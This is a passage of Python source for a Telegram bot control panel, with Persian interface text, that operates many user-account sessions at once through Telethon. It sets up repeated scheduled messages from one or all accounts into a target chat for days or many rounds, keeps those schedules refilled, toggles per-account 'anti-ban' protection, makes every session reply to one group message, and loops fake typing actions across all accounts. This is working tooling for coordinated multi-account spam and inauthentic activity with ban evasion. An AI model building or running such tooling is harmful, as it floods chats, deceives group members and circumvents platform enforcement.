      full_key = f"sched_{key}"
      task = sched_tasks.get(full_key)
      if task and not task.done():
          task.cancel()
          sched_tasks.pop(full_key, None)
          await event.answer(" لغو شد")
      else:
          await event.answer(" تسک پیدا نشد یا تموم شده")
      await sp_edit(event, _sched_panel_text(gname), buttons=_sched_main_buttons(gname))

    # ── loop-send: session list ───────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedloop_(.+)")))
    async def og_schedloop_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = og_sessions(gname)
      rows = []
      for s in sessions:
          icon = "🟢" if s in managed else "🔴"
          meta = managed.get(s)
          dn = ((meta["state"].get("display_name") or s) if meta else s)[:22]
          rows.append([Button.inline(f"🔢 {icon} {dn}", f"og_schedlsess_{gname}|{s}".encode())])
      rows.append([Button.inline("🔙 Back", f"og_sched_{gname}".encode())])
      await sp_edit(event, f" ارسال تکراری — سشن ارسال‌کننده رو انتخاب کن:", buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedlsess_([^|]+)\|(.+)")))
    async def og_schedlsess_cb(event):
      gname = event.pattern_match.group(1).decode()
      sess  = event.pattern_match.group(2).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await _sched_show_dialogs(event, gname, sess,
                                  back_cb=f"og_schedloop_{gname}",
                                  step_prefix=f"og_schedlchat_{gname}|{sess}")

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedlchat_([^|]+)\|([^|]+)\|(.+)")))
    async def og_schedlchat_cb(event):
      gname    = event.pattern_match.group(1).decode()
      sess     = event.pattern_match.group(2).decode()
      safe_cid = event.pattern_match.group(3).decode()
      chat_str = safe_cid.replace("m", "-", 1) if safe_cid.startswith("m") else safe_cid
      try:
          chat_id = int(chat_str)
      except ValueError:
          chat_id = chat_str
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pending_group_selection[event.sender_id] = {
          "og_step": "sched_loop_text", "og_gname": gname,
          "og_sess": sess, "og_chat": chat_id,
          "og_texts": [],
      }
      await sp_edit(event,
          f" ارسال تکراری — چند متن\n━━━━━━━━━━━━━━\n"
          f" سشن: {sess}\n گپ: {chat_id}\n\n"
          f" متن‌های پیام رو یکی یکی بفرست.\n"
          f"هر پیام در نوبت خودش ارسال میشه (به ترتیب).\n"
          f"وقتی تموم شد /done بنویس:",
          buttons=[[Button.inline("❌ Cancel", f"og_sched_{gname}".encode())]])
      await event.answer()

    # ── bulk loop: session selector (for dialog browsing) ─────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedloopbulk_(.+)")))
    async def og_schedloopbulk_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = og_sessions(gname)
      online = [s for s in sessions if s in managed]
      if not online:
          return await event.answer(" هیچ سشن آنلاینی توی این ریموت نیست", alert=True)
      rows = []
      for s in online:
          meta = managed.get(s)
          dn = ((meta["state"].get("display_name") or s) if meta else s)[:22]
          rows.append([Button.inline(f"🔘 {dn}", f"og_schedlbulksess_{gname}|{s}".encode())])
      rows.append([Button.inline("🔙 Back", f"og_sched_{gname}".encode())])
      await sp_edit(event,
          f" ارسال تکراری برای همه اکانت‌ها\n━━━━━━━━━━━━━━\n"
          f" {len(online)} اکانت آنلاین\n\n"
          f"یه اکانت برای دیدن لیست گپ‌ها انتخاب کن:",
          buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedlbulksess_([^|]+)\|(.+)")))
    async def og_schedlbulksess_cb(event):
      gname = event.pattern_match.group(1).decode()
      sess  = event.pattern_match.group(2).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await _sched_show_dialogs(event, gname, sess,
                                  back_cb=f"og_schedloopbulk_{gname}",
                                  step_prefix=f"og_schedlbulkchat_{gname}|{sess}")

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedlbulkchat_([^|]+)\|([^|]+)\|(.+)")))
    async def og_schedlbulkchat_cb(event):
      gname    = event.pattern_match.group(1).decode()
      sess     = event.pattern_match.group(2).decode()
      safe_cid = event.pattern_match.group(3).decode()
      chat_str = safe_cid.replace("m", "-", 1) if safe_cid.startswith("m") else safe_cid
      try:
          chat_id = int(chat_str)
      except ValueError:
          chat_id = chat_str
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = og_sessions(gname)
      online = [s for s in sessions if s in managed]
      pending_group_selection[event.sender_id] = {
          "og_step": "sched_loop_text", "og_gname": gname,
          "og_sess": sess, "og_chat": chat_id,
          "og_texts": [], "og_bulk": True, "og_bulk_sessions": online,
      }
      await sp_edit(event,
          f" ارسال تکراری — همه اکانت‌ها\n━━━━━━━━━━━━━━\n"
          f"📱 {len(online)} اکانت: {', '.join(s[:12] for s in online[:5])}{'...' if len(online)>5 else ''}\n"
          f" گپ: {chat_id}\n\n"
          f" متن‌های پیام رو یکی یکی بفرست.\n"
          f"هر پیام در نوبت خودش ارسال میشه (به ترتیب).\n"
          f"وقتی تموم شد /done بنویس:",
          buttons=[[Button.inline("❌ Cancel", f"og_sched_{gname}".encode())]])
      await event.answer()

    # ── stop condition: by duration ───────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedlbydur_(.+)")))
    async def og_schedlbydur_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pend = pending_group_selection.get(event.sender_id, {})
      if pend.get("og_step") != "sched_loop_waitstop":
          return await event.answer(" وضعیت نامعتبر — از اول شروع کن", alert=True)
      og_sess  = pend.get("og_sess", "")
      og_chat  = pend.get("og_chat", "")
      og_texts = pend.get("og_texts", [])
      ivl_secs = pend.get("og_interval", 300)
      ivl_str  = pend.get("og_interval_str", "5m")
      og_bulk  = pend.get("og_bulk", False)
      og_bulk_sessions = pend.get("og_bulk_sessions", [])
      pending_group_selection[event.sender_id] = {
          "og_step": "sched_loop_duration",
          "og_gname": gname, "og_sess": og_sess,
          "og_chat": og_chat, "og_texts": og_texts,
          "og_interval": ivl_secs, "og_interval_str": ivl_str,
          "og_bulk": og_bulk, "og_bulk_sessions": og_bulk_sessions,
      }
      await sp_edit(event,
          f" تا چند روز ادامه بده؟\n\n"
          f"• 1  →  ۱ روز\n"
          f"• 3  →  ۳ روز\n"
          f"• 7  →  یک هفته\n"
          f"• 0.5 → نیم روز (۱۲ ساعت)",
          buttons=[[Button.inline("❌ Cancel", f"og_sched_{gname}".encode())]])
      await event.answer()

    # ── stop condition: by count ──────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedlbycount_(.+)")))
    async def og_schedlbycount_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pend = pending_group_selection.get(event.sender_id, {})
      if pend.get("og_step") != "sched_loop_waitstop":
          return await event.answer(" وضعیت نامعتبر — از اول شروع کن", alert=True)
      og_sess  = pend.get("og_sess", "")
      og_chat  = pend.get("og_chat", "")
      og_texts = pend.get("og_texts", [])
      ivl_secs = pend.get("og_interval", 300)
      ivl_str  = pend.get("og_interval_str", "5m")
      og_bulk  = pend.get("og_bulk", False)
      og_bulk_sessions = pend.get("og_bulk_sessions", [])
      pending_group_selection[event.sender_id] = {
          "og_step": "sched_loop_count",
          "og_gname": gname, "og_sess": og_sess,
          "og_chat": og_chat, "og_texts": og_texts,
          "og_interval": ivl_secs, "og_interval_str": ivl_str,
          "og_bulk": og_bulk, "og_bulk_sessions": og_bulk_sessions,
      }
      await sp_edit(event,
          f" چند بار کل پیام‌ها ارسال بشه؟\n\n"
          f"• 10  →  ۱۰ بار (هر متن به نوبه)\n"
          f"• 50  →  ۵۰ بار\n"
          f"• 100 →  ۱۰۰ بار\n\n"
          f" عدد کل ارسال‌هاست، نه تعداد هر متن.",
          buttons=[[Button.inline("❌ Cancel", f"og_sched_{gname}".encode())]])
      await event.answer()

    # ── auto-refill toggle ────────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedrefill_(.+)")))
    async def og_schedrefill_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      existing = bulk_refill_tasks.get(gname)
      if existing and not existing.done():
          existing.cancel()
          bulk_refill_tasks.pop(gname, None)
          await event.answer(" Auto-Refill خاموش شد")
      else:
          cfg = bulk_refill_configs.get(gname)
          if not cfg:
              return await event.answer(
                    " ابتدا یه bulk schedule اجرا کن تا config ذخیره بشه", alert=True)
          task = asyncio.get_event_loop().create_task(
              _bulk_refill_loop(gname, event.chat_id))
          bulk_refill_tasks[gname] = task
          n = len(cfg.get("sessions", []))
          await event.answer(f" Auto-Refill روشن شد — {n} اکانت هر ۱ ساعت چک میشن")
      await sp_edit(event, _sched_panel_text(gname), buttons=_sched_main_buttons(gname))

    # ── stop loop task ────────────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedlstop_(.+)")))
    async def og_schedlstop_cb(event):
      key   = event.pattern_match.group(1).decode()
      gname = key.split("|")[0] if "|" in key else key
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      full_key = f"schedloop_{key}"
      task = sched_tasks.get(full_key)
      cancelled_any = False
      if task and not task.done():
          task.cancel()
          sched_tasks.pop(full_key, None)
          cancelled_any = True

      batch = native_sched_batches.get(full_key)
      if batch and batch.get("msg_ids"):
          meta = managed.get(batch["sess"])
          if meta:
              try:
                    chat_entity = await meta["client"].get_entity(batch["chat"])
                    await meta["client"](DeleteScheduledMessagesRequest(peer=chat_entity, id=batch["msg_ids"]))
                    cancelled_any = True
              except Exception as e:
                    log.warning(f"[native_sched] cancel error: {e}")
          native_sched_batches.pop(full_key, None)

      if cancelled_any:
          await event.answer(" لوپ/پیام‌های زمان‌بندی‌شده لغو شدن")
      else:
          await event.answer(" لوپ پیدا نشد یا قبلاً تموم شده")
      await sp_edit(event, _sched_panel_text(gname), buttons=_sched_main_buttons(gname))

    # ── live panel: real-time scheduled count per session ─────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedlive_(.+)")))
    async def og_schedlive_cb(event):
      import datetime as _dt
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await event.answer(" در حال دریافت اطلاعات از تلگرام...")

      cfg = bulk_refill_configs.get(gname)
      if not cfg:
          # fallback: all sessions in group with any native_sched_batches
          sessions = og_sessions(gname)
          chat = None
          for k, b in native_sched_batches.items():
              if k.startswith(f"schedloop_{gname}|"):
                    chat = b.get("chat")
                    break
      else:
          sessions = cfg.get("sessions", [])
          chat = cfg.get("chat")

      if not sessions:
          return await sp_edit(event,
              " هنوز هیچ bulk schedule ای اجرا نشده.",
              buttons=[[Button.inline("🔙 Back", f"og_sched_{gname}".encode())]])

      lines = [f" وضعیت لایو — ریموت {gname}\n━━━━━━━━━━━━━━"]
      now_utc = _dt.datetime.utcnow()
      lines.append(f" زمان بررسی: {now_utc.strftime('%H:%M:%S UTC')}\n")

      for sess in sessions:
          meta = managed.get(sess)
          if not meta:
              lines.append(f" {sess[:18]}: آفلاین")
              continue
          try:
              chat_entity = await _resolve_entity(meta["client"], chat)

              if not chat_entity:
                    lines.append(f" {sess[:18]}: عضو کانال نیست یا دسترسی ندارد")
                    continue

              result = await meta["client"](GetScheduledHistoryRequest(peer=chat_entity, hash=0))
              msgs = result.messages
              count = len(msgs)

              if count == 0:
                    lines.append(f" {sess[:18]}: ۰ پیام scheduled (تموم شد)")
              else:
                    # Find next scheduled message
                    future_msgs = [m for m in msgs if hasattr(m, "date") and m.date]
                    if future_msgs:
                        next_msg = min(future_msgs, key=lambda m: m.date.timestamp() if hasattr(m.date, "timestamp") else 0)
                        next_ts  = next_msg.date
                        if hasattr(next_ts, "strftime"):
                            next_str = next_ts.strftime("%H:%M UTC")
                        else:
                            next_str = str(next_ts)
                    else:
                        next_str = "?"
                    lines.append(f" {sess[:18]}: {count} پیام باقی‌مانده | بعدی: {next_str}")
          except Exception as e:
              lines.append(f" {sess[:18]}: خطا — {str(e)[:40]}")

      text_out = "\n".join(lines)
      await sp_edit(event, text_out,
          buttons=[
              [Button.inline("🔄 رفرش", f"og_schedlive_{gname}".encode())],
              [Button.inline("📌 پاک کردن همه scheduled", f"og_schedlbulkdel_{gname}".encode())],
              [Button.inline("📋 پنل زمانبندی", f"og_sched_{gname}".encode()),
                 Button.inline("📋 Menu", b"menu_refresh")],
          ])

    # ── bulk delete: delete ALL scheduled msgs for all sessions ─
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_schedlbulkdel_(.+)")))
    async def og_schedlbulkdel_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await event.answer(" در حال پاک کردن...")

      cfg = bulk_refill_configs.get(gname)
      if not cfg:
          sessions = og_sessions(gname)
          chat = None
          for k, b in native_sched_batches.items():
              if k.startswith(f"schedloop_{gname}|"):
                    chat = b.get("chat")
                    break
      else:
          sessions = cfg.get("sessions", [])
          chat = cfg.get("chat")

      if not sessions or not chat:
          return await event.answer(" هیچ bulk config ای پیدا نشد", alert=True)

      ok_del, fail_del = [], []
      for sess in sessions:
          meta = managed.get(sess)
          if not meta:
              fail_del.append(f"• {sess[:16]}: آفلاین")
              continue
          try:
              chat_entity = await _resolve_entity(meta["client"], chat)

              if not chat_entity:
                    fail_del.append(f"• {sess[:16]}: عضو کانال نیست یا دسترسی ندارد")
                    continue

              result = await meta["client"](GetScheduledHistoryRequest(peer=chat_entity, hash=0))
              msg_ids = [m.id for m in result.messages if hasattr(m, "id")]
              if msg_ids:
                    await meta["client"](DeleteScheduledMessagesRequest(peer=chat_entity, id=msg_ids))
                    ok_del.append(f"• {sess[:16]}: {len(msg_ids)} پیام پاک شد ")
              else:
                    ok_del.append(f"• {sess[:16]}: خالی بود")
              # Clean up local batch records
              for k in list(native_sched_batches.keys()):
                    if k.startswith(f"schedloop_{gname}|{sess}|"):
                        native_sched_batches.pop(k, None)
          except Exception as e:
              fail_del.append(f"• {sess[:16]}: {str(e)[:40]}")

      ok_txt   = "\n".join(ok_del)   or "—"
      fail_txt = "\n".join(fail_del) or "—"
      summary  = (
          f" پاک کردن bulk تموم شد!\n━━━━━━━━━━━━━━\n"
          f" موفق ({len(ok_del)}):\n{ok_txt}"
          + (f"\n\n❌ ناموفق ({len(fail_del)}):\n{fail_txt}" if fail_del else "")
      )
      await sp_edit(event, summary,
          buttons=[
              [Button.inline("📋 پنل لایو", f"og_schedlive_{gname}".encode())],
              [Button.inline("📋 پنل زمانبندی", f"og_sched_{gname}".encode()),
                 Button.inline("📋 Menu", b"menu_refresh")],
          ])

    # ── ریتم پنل ─────────────────────────────────────────────
    def _rhm_panel_text(gname):
      rhm = groups_db.get(gname, {}).get("rhythm", {})
      txt = rhm.get("text", "—")
      chat = rhm.get("target", "—")
      emojis = rhm.get("emojis", [])
      reply_to = rhm.get("reply_to")
      cnt = len(groups_db.get(gname, {}).get("sessions", []))
      emoji_str = " ".join(emojis[:6]) + (f" (+{len(emojis)-6})" if len(emojis) > 6 else "") if emojis else "—"
      reply_str = f"پیام {reply_to}" if reply_to else "— (ست نشده)"
      return (
          f" Rhythm — ریموت {gname}\n"
          f"━━━━━━━━━━━━━━\n"
          f" متن: {txt}\n"
          f" ایموجی: {emoji_str}\n"
          f" گپ: {chat}\n"
          f" Reply To: {reply_str}\n"
          f" تعداد سشن: {cnt}\n\n"
          f"لینک پیام گروه رو بده تا همه روش ریپلای بزنن."
      )

    def _rhm_buttons(gname):
      rhm = groups_db.get(gname, {}).get("rhythm", {})
      has_text = bool(rhm.get("text"))
      has_emojis = bool(rhm.get("emojis"))
      has_target = bool(rhm.get("target") and rhm.get("reply_to"))
      rows = [
          [Button.inline("⚙️ Set Text", f"og_rhmt_{gname}".encode()),
             Button.inline("🔘 Emojis", f"og_rhme_{gname}".encode())],
          [Button.inline("👥 Set Reply Link (Group)", f"og_rhmrl_{gname}".encode())],
          [Button.inline("🗑 Clear Reply Link", f"og_rhmclrrl_{gname}".encode()),
             Button.inline("🗑 Clear Emojis", f"og_rhmclre_{gname}".encode())],
          [Button.inline("🗑 Clear Text", f"og_rhmclrt_{gname}".encode())],
      ]
      if (has_text or has_emojis) and has_target:
          rows.append([Button.inline("🟢 Start Rhythm", f"og_rhms_{gname}".encode())])
      rows.append([Button.inline("🔙 Back", f"og_home_{gname}".encode())])
      return rows

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_rhmh_(.+)")))
    async def og_rhmh_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await sp_edit(event, _rhm_panel_text(gname), buttons=_rhm_buttons(gname))
      await event.answer()

    # ── Anti-Ban panel ─────────────────────────────────────────
    def _antibn_panel(gname):
      sessions = og_sessions(gname)
      lines = [f" آنتی‌بن — ریموت {gname}\n━━━━━━━━━━━━━━"]
      for s in sessions:
          enabled = anti_ban_enabled.get(s, True)
          meta = managed.get(s)
          dn = (meta["state"].get("display_name") or s) if meta else s
          status = "🟢" if meta else "🔴"
          ab = "🛡 فعال" if enabled else "🔓 غیرفعال"
          lines.append(f"{status} {dn}: {ab}")
      if not sessions:
          lines.append("هیچ سشنی نیست.")
      return "\n".join(lines)

    def _antibn_buttons(gname):
      sessions = og_sessions(gname)
      rows = []
      for s in sessions:
          enabled = anti_ban_enabled.get(s, True)
          meta = managed.get(s)
          dn = ((meta["state"].get("display_name") or s) if meta else s)[:18]
          lbl = f"{'🛡' if enabled else '🔓'} {dn}"
          rows.append([Button.inline(lbl, f"og_antibn_tgl_{gname}|{s}".encode())])
      rows.append([
          Button.inline("📌 All Active", f"og_antibn_all_{gname}|1".encode()),
          Button.inline("📌 All Off", f"og_antibn_all_{gname}|0".encode()),
      ])
      rows.append([Button.inline("🔙 Back", f"og_home_{gname}".encode())])
      return rows

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_antibn_(.+)")))
    async def og_antibn_cb(event):
      data = event.pattern_match.group(1).decode()

      # toggle individual session: og_antibn_tgl_{gname}|{sess}
      if data.startswith("tgl_"):
          rest = data[4:]
          gname, sess = rest.split("|", 1)
          if not og_guard(event, gname):
              return await event.answer(" دسترسی ندارید", alert=True)
          cur = anti_ban_enabled.get(sess, True)
          anti_ban_enabled[sess] = not cur
          st = "🛡 فعال" if anti_ban_enabled[sess] else "🔓 غیرفعال"
          await event.answer(f"آنتی‌بن {sess}: {st}")
          await sp_edit(event, _antibn_panel(gname), buttons=_antibn_buttons(gname))
          return

      # toggle all: og_antibn_all_{gname}|{0/1}
      if data.startswith("all_"):
          rest = data[4:]
          gname, val = rest.rsplit("|", 1)
          if not og_guard(event, gname):
              return await event.answer(" دسترسی ندارید", alert=True)
          enabled = (val == "1")
          for s in og_sessions(gname):
              anti_ban_enabled[s] = enabled
          lbl = "فعال" if enabled else "غیرفعال"
          await event.answer(f"آنتی‌بن همه سشن‌ها: {lbl}")
          await sp_edit(event, _antibn_panel(gname), buttons=_antibn_buttons(gname))
          return

      # panel: og_antibn_{gname}
      gname = data
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await sp_edit(event, _antibn_panel(gname), buttons=_antibn_buttons(gname))
      await event.answer()

    # ── اکشن گروهی ────────────────────────────────────────────
    _ACTION_MAP = {
      "typing":    (" درحال تایپ",              lambda: SendMessageTypingAction()),
      "voice":     (" درحال ارسال ویس",          lambda: SendMessageRecordAudioAction()),
      "video":     (" درحال ارسال ویدیو",        lambda: SendMessageUploadVideoAction(progress=0)),
      "sticker":   (" درحال پیدا کردن استیکر",  lambda: SendMessageChooseStickerAction()),
      "vidnote":   (" درحال ارسال ویدیو مسیج",  lambda: SendMessageRecordRoundAction()),
      "document":  (" درحال ارسال فایل",         lambda: SendMessageUploadDocumentAction(progress=0)),
    }

    def _act_panel_text(gname):
      target = groups_db.get(gname, {}).get("action_target", "—")
      sessions = og_sessions(gname)
      online = sum(1 for s in sessions if s in managed)
      return (
          f" Bulk Action — {gname}\n"
          f"━━━━━━━━━━━━━━\n"
          f" سشن‌ها: {len(sessions)}   آنلاین: {online}\n"
          f" گپ هدف: {target}\n\n"
          f"یه اکشن انتخاب کن — همه سشن‌ها ارسال می‌کنن:"
      )

    def _act_buttons(gname):
      items = list(_ACTION_MAP.items())
      rows = []
      for i in range(0, len(items), 2):
          pair = items[i:i+2]
          rows.append([Button.inline(lbl, f"og_actdo_{gname}|{ak}".encode()) for ak, (lbl, _) in pair])
      rows.append([Button.inline("⚙️ Set Target Chat", f"og_acttgt_{gname}".encode()),
                     Button.inline("📋 From List", f"og_actdlg_{gname}".encode())])
      rows.append([Button.inline("🔙 Back", f"og_home_{gname}".encode())])
      return rows

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_act_(.+)")))
    async def og_act_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await sp_edit(event, _act_panel_text(gname), buttons=_act_buttons(gname))
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_acttgt_(.+)")))
    async def og_acttgt_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pending_group_selection[event.sender_id] = {"og_step": "act_target", "og_gname": gname}
      await sp_edit(event,
          f" آیدی یا @username گپ هدف برای اکشن ریموت «{gname}»:\n(مثال: @mygroup یا -100xxxxxxxx)",
          buttons=[[Button.inline("❌ Cancel", f"og_act_{gname}".encode()),
                      Button.inline("📋 From List", f"og_actdlg_{gname}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_actdlg_(.+)")))
    async def og_actdlg_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = og_sessions(gname)
      first_sess = next((s for s in sessions if s in managed), None)
      if not first_sess:
          return await event.answer(" هیچ سشن آنلاینی نیست", alert=True)
      await event.answer(" در حال دریافت لیست...")
      try:
          dialogs = []
          async for d in managed[first_sess]["client"].iter_dialogs(limit=100):
              if d.is_group or d.is_channel:
                    dialogs.append((d.title[:25] or str(d.id), str(d.id)))
              if len(dialogs) >= 20:
                    break
          if not dialogs:
              return await sp_edit(event, " هیچ گروه/کانالی پیدا نشد.",
                                    buttons=[[Button.inline("🔙 Back", f"og_act_{gname}".encode())]])
          rows = [[Button.inline(title, f"og_actsel_{gname}|{cid}".encode())]
                    for title, cid in dialogs]
          rows.append([Button.inline("🔙 Back", f"og_act_{gname}".encode())])
          await sp_edit(event, f" انتخاب گپ هدف برای اکشن — {gname}:", buttons=rows)
      except Exception as e:
          await sp_edit(event, f" خطا: {e}",
                         buttons=[[Button.inline("🔙 Back", f"og_act_{gname}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_actsel_([^|]+)\|(.+)")))
    async def og_actsel_cb(event):
      gname = event.pattern_match.group(1).decode()
      chat_id_str = event.pattern_match.group(2).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      groups_db.setdefault(gname, {})["action_target"] = chat_id_str
      save_groups()
      await event.answer(f" گپ هدف: {chat_id_str}")
      await sp_edit(event, _act_panel_text(gname), buttons=_act_buttons(gname))

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_actdo_([^|]+)\|(.+)")))
    async def og_actdo_cb(event):
      gname = event.pattern_match.group(1).decode()
      act_key = event.pattern_match.group(2).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      target_str = groups_db.get(gname, {}).get("action_target", "")
      if not target_str or target_str == "—":
          return await event.answer(" اول گپ هدف رو تنظیم کن", alert=True)
      act_info = _ACTION_MAP.get(act_key)
      if not act_info:
          return await event.answer(" اکشن نامعلوم", alert=True)
      act_lbl, act_fn = act_info
      sessions = og_sessions(gname)

      # cancel previous loop for this group if running
      prev = act_loop_tasks.get(gname)
      if prev and not prev.done():
          prev.cancel()

      await sp_edit(event,
          f" اکشن لوپ شروع شد!\n{act_lbl}\n━━━━━━━━━━━━━━\n {len(sessions)} سشن — هر 5 ثانیه تکرار می‌شه",
          buttons=[[Button.inline("🔴 Stop", f"og_actstop_{gname}".encode())]])
      await event.answer()

      async def _resolve_act_target(client, t: str):
          t = t.strip()
          if t.lstrip("-").isdigit():
              t_int = int(t)
              try:
                    return await client.get_entity(t_int)
              except Exception:
                    pass
              if t_int < 0:
                    try:
                        raw = abs(t_int)
                        if raw > 1000000000000:
                            raw -= 1000000000000
                        from telethon.tl import types as _tlt
                        return await client.get_entity(_tlt.PeerChannel(channel_id=raw))
                    except Exception:
                        pass
              return None
          try:
              return await client.get_entity(t)
          except Exception:
              return None

      async def _act_send_one_loop(s, ent_cache):
          meta = managed.get(s)
          if not meta:
              return False
          try:
              if s not in ent_cache:
                    ent_cache[s] = await _resolve_act_target(meta["client"], target_str)
              ent = ent_cache[s]
              if ent is None:
                    return False
              await meta["client"](SetTypingRequest(peer=ent, action=act_fn()))
              return True
          except Exception as e:
              log.warning(f"[actloop:{gname}] {s} error: {e}")
              ent_cache.pop(s, None)
              return False

      async def _act_loop():
          ent_cache = {}
          rounds = 0
          try:
              while True:
                    try:
                        results_bool = await asyncio.gather(*[_act_send_one_loop(s, ent_cache) for s in sessions], return_exceptions=True)
                        rounds += 1
                        ok = sum(1 for r in results_bool if r)
                        fail = len(results_bool) - ok
                        log.info(f"[actloop:{gname}] round {rounds} — ok={ok} fail={fail}")
                    except asyncio.CancelledError:
                        raise
                    except Exception as e:
                        log.warning(f"[actloop:{gname}] gather error: {e}")
                    await asyncio.sleep(5)
          except asyncio.CancelledError:
              pass

      task = asyncio.get_event_loop().create_task(_act_loop())
      act_loop_tasks[gname] = task

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_actstop_(.+)")))
    async def og_actstop_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      task = act_loop_tasks.get(gname)
      if task and not task.done():
          task.cancel()
      act_loop_tasks.pop(gname, None)
      await sp_edit(event,
          f" اکشن لوپ برای ریموت «{gname}» متوقف شد.",
          buttons=[[Button.inline("⚡ Retry Action", f"og_act_{gname}".encode()),
                      Button.inline("👥 Group", f"og_home_{gname}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_rhmt_(.+)")))
    async def og_rhmt_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pending_group_selection[event.sender_id] = {"og_step": "rhythm_text", "og_gname": gname}
      await sp_edit(event, f" متن ریتم برای ریموت «{gname}» رو بنویس:",
                     buttons=[[Button.inline("❌ Cancel", f"og_rhmh_{gname}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_rhmc_(.+)")))
    async def og_rhmc_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      pending_group_selection[event.sender_id] = {"og_step": "rhythm_chat", "og_gname": gname}
      await sp_edit(event, f" آیدی یا @username گپ مقصد برای ریموت «{gname}»:\n(مثال: @mygroup یا -100xxxxxxxx)",
                     buttons=[[Button.inline("❌ Cancel", f"og_rhmh_{gname}".encode()),
                               Button.inline("📋 From List", f"og_rhmdl_{gname}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_rhmdl_(.+)")))
    async def og_rhmdl_cb(event):
      """نمایش لیست گروه‌های اخیر سشن برای انتخاب هدف ریتم"""
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = groups_db.get(gname, {}).get("sessions", [])
      first_sess = next((s for s in sessions if s in managed), None)
      if not first_sess:
          return await event.answer(" هیچ سشن آنلاینی نیست", alert=True)
      await event.answer(" در حال دریافت لیست...")
      try:
          dialogs = []
          async for d in managed[first_sess]["client"].iter_dialogs(limit=300):
              if d.is_group or d.is_channel:
                    title = d.title or str(d.id)
                    # d.id already returns the correct peer ID (-100XXXX for channels)
                    chat_id = d.id
                    dialogs.append((title[:28], str(chat_id)))
              if len(dialogs) >= 50:
                    break
          if not dialogs:
              await sp_edit(event, " هیچ گروه/کانالی پیدا نشد.",
                             buttons=[[Button.inline("🔙 Back", f"og_rhmh_{gname}".encode())]])
              return
          rows = [[Button.inline(title, f"og_rhmsel_{gname}|{cid}".encode())]
                    for title, cid in dialogs]
          rows.append([Button.inline("🔙 Back", f"og_rhmh_{gname}".encode())])
          await sp_edit(event, f" انتخاب گپ مقصد برای ریتم — {gname} ({len(dialogs)} گپ):", buttons=rows)
      except Exception as e:
          await sp_edit(event, f" خطا در دریافت لیست: {e}",
                         buttons=[[Button.inline("🔙 Back", f"og_rhmh_{gname}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_rhmsel_([^|]+)\|(.+)")))
    async def og_rhmsel_cb(event):
      gname = event.pattern_match.group(1).decode()
      chat_id_str = event.pattern_match.group(2).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
